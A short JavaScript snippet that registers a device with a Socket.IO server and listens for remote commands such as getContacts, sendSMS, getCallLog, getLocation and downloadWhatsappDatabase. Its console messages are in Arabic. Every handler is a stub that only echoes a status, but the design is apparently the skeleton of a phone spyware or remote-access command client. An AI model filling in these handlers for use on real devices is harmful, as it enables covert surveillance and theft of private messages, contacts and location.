const socket = io();
const deviceId = 'device_' + Math.floor(Math.random()*10000);
const model = navigator.userAgent;
socket.emit('join', {id: deviceId, model});
console.log(`تم تسجيل الجهاز: ${deviceId}`);

const allowedActions = ['getDir','getInstalledApps','getContacts','sendSMS','getCallLog','previewImage','getSMS','getLocation','download','downloadWhatsappDatabase','openUrl','downloadFile'];
allowedActions.forEach(action => {
  socket.on(action, (data, callback) => {
    console.log(`استقبال الأمر: ${action}`, data);
    let result = {status:'done', action, data};
    if(callback) callback(result);
    socket.emit(action, result);
  });
});
